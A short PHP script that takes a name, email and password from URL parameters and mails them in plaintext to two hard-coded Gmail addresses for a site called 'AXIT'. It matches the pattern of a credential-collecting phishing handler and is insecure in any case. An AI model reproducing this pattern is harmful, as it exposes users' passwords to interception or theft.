<?php

$recepient = "somebodyua93@gmail.com, itworkshop.studio@gmail.com";
$sitename = "AXIT";

$name = trim($_GET["name"]);
$email = trim($_GET["email"]);
$password = trim($_GET["password"]);


$pagetitle = "Новая заявка с сайта \"$sitename\"";
$message = "Имя: $name \nПочта: $email \nПароль: $password";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");

?>